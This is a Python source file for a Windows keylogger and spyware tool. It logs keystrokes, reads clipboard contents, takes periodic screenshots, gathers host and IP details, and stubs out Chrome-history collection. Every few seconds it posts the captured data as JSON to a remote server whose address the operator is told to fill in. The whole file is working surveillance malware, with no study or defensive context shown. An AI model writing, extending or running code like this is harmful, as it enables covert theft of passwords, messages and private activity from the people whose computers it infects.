import time
import os
import base64
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
import socket
import platform
import win32clipboard
import pandas as pd
import requests
import threading
import datetime

# Remote server configuration
SERVER_IP = '127.0.0.1'  # Replace with your server's IP address
SERVER_PORT = 5000
SERVER_URL = f'http://{SERVER_IP}:{SERVER_PORT}/receive'  # URL to send data

# Create a directory to store local data temporarily
LOCAL_DATA_DIR = 'temp_data'
os.makedirs(LOCAL_DATA_DIR, exist_ok=True)

# Log file path for keystrokes
log_file_path = os.path.join(LOCAL_DATA_DIR, "logs.txt")

# Function to transmit data to the server
def transmit_data(data):
    try:
        response = requests.post(SERVER_URL, json=data)
        response.raise_for_status()
        print("Data transmitted successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Error transmitting data: {e}")

# Function to record keystrokes
k = []

def on_press(key):
    k.append(key)

def on_release(key):
    if key == Key.esc:
        return False

# Function to save keystrokes to file every 30 seconds
def save_keystrokes_periodically():
    while True:
        time.sleep(30)  # Save every 30 seconds
        if k:  # Check if there are any keystrokes to write
            with open(log_file_path, "a") as f:
                f.write(' '.join(str(i).replace("'", "") for i in k) + '\n')
            k.clear()  # Clear keystrokes after writing

# Function to send the log file every 2 seconds
def transmit_log_file():
    while True:
        time.sleep(2)  # Send the log file every 2 seconds
        if os.path.exists(log_file_path):
            with open(log_file_path, 'r') as f:
                log_data = f.read()

            # Transmit the log file contents to the server
            transmit_data({
                'keystrokes': log_data
            })

# Get computer information
def get_computer_info():
    date = str(datetime.date.today())
    ip_address = socket.gethostbyname(socket.gethostname())
    processor = platform.processor()
    system = platform.system()
    release = platform.release()
    host_name = socket.gethostname()

    data = {
        'Date': date,
        'IP Address': ip_address,
        'Processor': processor,
        'System': system,
        'Release': release,
        'Host Name': host_name,
    }
    return data

# Save computer information to an Excel file
def save_computer_info(data):
    df = pd.DataFrame(data.items(), columns=['Metric', 'Value'])
    df.to_excel(os.path.join(LOCAL_DATA_DIR, 'computer_info.xlsx'), index=False)

# Get clipboard data
def get_clipboard_data():
    try:
        win32clipboard.OpenClipboard()
        clipboard_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return clipboard_data
    except Exception as e:
        return f"Clipboard error: {str(e)}"

# Get Chrome browsing history (placeholder function, you can implement your own logic)
def get_chrome_history():
    # Placeholder: This function should be implemented to retrieve Chrome history.
    return [{'url': 'http://example.com', 'title': 'Example', 'timestamp': datetime.datetime.now().isoformat()}]

# Take a screenshot
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(os.path.join(LOCAL_DATA_DIR, 'screenshot.png'))

# Function to capture and send screenshots every 10 minutes
def capture_and_send_screenshot():
    while True:
        take_screenshot()
        with open(os.path.join(LOCAL_DATA_DIR, 'screenshot.png'), 'rb') as f:
            screenshot_data = base64.b64encode(f.read()).decode('utf-8')

        # Transmit screenshot to the server
        transmit_data({'screenshot': screenshot_data})

        time.sleep(600)  # Capture and send every 10 minutes (600 seconds)

# Data collection thread
def data_collection():
    while True:
        # Send clipboard data
        clipboard_data = get_clipboard_data()
        transmit_data({'clipboard_data': clipboard_data})

        # Send Chrome history
        chrome_history = get_chrome_history()
        transmit_data({'chrome_history': chrome_history})

        time.sleep(10)  # Collect data every 10 seconds

# Main function to start the listener
if __name__ == "__main__":
    # Start threads for data collection, keystroke saving, and log transmission
    threading.Thread(target=transmit_log_file, daemon=True).start()
    threading.Thread(target=save_keystrokes_periodically, daemon=True).start()
    threading.Thread(target=capture_and_send_screenshot, daemon=True).start()
    threading.Thread(target=data_collection, daemon=True).start()

    # Start the keystroke listener
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            # Collect computer info at startup
            computer_info = get_computer_info()
            save_computer_info(computer_info)

            listener.join()
    except Exception as e:
        print(f"Error with listener: {e}")
